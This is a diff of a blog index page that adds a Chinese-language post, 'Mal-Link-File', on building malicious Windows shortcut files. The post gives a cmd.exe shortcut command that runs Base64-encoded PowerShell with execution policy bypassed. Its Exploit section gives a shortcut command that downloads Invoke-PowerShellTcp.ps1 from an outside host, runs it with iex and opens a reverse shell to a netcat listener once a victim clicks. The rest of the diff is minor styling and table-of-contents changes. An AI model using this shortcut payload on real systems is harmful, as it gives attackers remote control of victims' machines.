@@ -188,6 +188,82 @@
         
 
 <div class="post">
+    <a href="/2025/06/10/mal-link-file/">
+        <h2 class="post-title">Mal-Link-File</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/6/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#basic">Basic</a></li>
+<li><a href="#exploit">Exploit</a></li>
+<li><a href="#reference">Reference</a></li>
+</ul>
+<h1 id="basic">Basic</h1>
+<ul>
+<li>捷徑的<a
+target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1880321/why-does-the-260-character-path-length-limit-exist-in-windows">最高可以輸入260個字元</a></li>
+<li>PowerShell -ec 可以使用 Base64 編碼，但是必須是 UTF-16LE 編碼的字串
+<img src="/2025/06/10/mal-link-file/pwsh-base64.png" class="" title="PowerShell Base64 Encode"></li>
+<li>測試用指令編碼 👉 <a
+target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Encode_text(&#39;UTF-16LE%20(1200)&#39;)To_Base64(&#39;A-Za-z0-9%2B/%3D&#39;)&amp;input=d2hvYW1pIC9wcml2">CyberChef</a></li>
+<li>製作cmd.exe的捷徑，並將指令塞入</li>
+</ul>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>C<span class="op">:</span>\Windows\System32\cmd<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>k <span class="st">&quot;start winword %cd%/test.docx &amp;&amp; set z=ec &amp;&amp; call powershell -exec bypass -nop -%z%dwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYA&quot;</span></span></code></pre></div>
+<img src="/2025/06/10/mal-link-file/pwsh-test.png" class="">
+<h1 id="exploit">Exploit</h1>
+<ul>
+<li>建立 http server <img src="/2025/06/10/mal-link-file/http-server.png" class=""></li>
+<li>設立 nc 接收回彈的 shell <img src="/2025/06/10/mal-link-file/nc-shell.png" class=""></li>
+<li>捷徑內指令</li>
+</ul>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="op">%</span>systemroot<span class="op">%</span>\System32\cmd<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>c <span class="st">&quot;call powershell -exec bypass -nop iex(New-Object Net.WebClient).DownloadString(&#39;http://172.28.166.2:8000/Invoke%2DPowerShellTcp%2Eps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 172.28.166.2 -Port 9999&quot;</span></span></code></pre></div>
+<ul>
+<li>待使用者點擊捷徑後，便可接收到 shell <img src="/2025/06/10/mal-link-file/get-shell.png" class=""></li>
+</ul>
+<h1 id="reference">Reference</h1>
+<ul>
+<li><a
+target="_blank" rel="noopener" href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://www.trendmicro.com/en_vn/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html">https://www.trendmicro.com/en_vn/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html</a></li>
+</ul>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/exploit/" style="color: #00a596">exploit</a>
+        </span>
+        
+    </div>
+    <a href="/2025/06/10/mal-link-file/" class="go-post">閱讀全文</a>
+</div>
+
+<div class="post">
     <a href="/2025/06/10/how-cryptocurrencies-work-translation/">
         <h2 class="post-title">How Cryptocurrencies Work (Technical Guide)</h2>
     </a>
@@ -692,7 +768,7 @@ target="_blank" rel="noopener" href="https://www.patreon.com/sandoche">Patreon</
         
         <span class="tag">
             
-            <a href="/tags/crypto-currencies/" style="color: #ff7d73">crypto-currencies</a>
+            <a href="/tags/crypto-currencies/" style="color: #00a596">crypto-currencies</a>
         </span>
         
     </div>
@@ -728,6 +804,8 @@ target="_blank" rel="noopener" href="https://www.patreon.com/sandoche">Patreon</
 <li><a href="#使用主題">使用主題</a>
 <ul>
 <li><a href="#安裝-particlex">安裝 ParticleX</a></li>
+<li><a href="#程式碼高光">程式碼高光</a></li>
+<li><a href="#避免使用中國的資源">避免使用中國的資源</a></li>
 <li><a href="#新增導覽頁面">新增導覽頁面</a></li>
 <li><a href="#建立新文章">建立新文章</a></li>
 <li><a href="#大功告成查看結果">大功告成，查看結果</a></li>
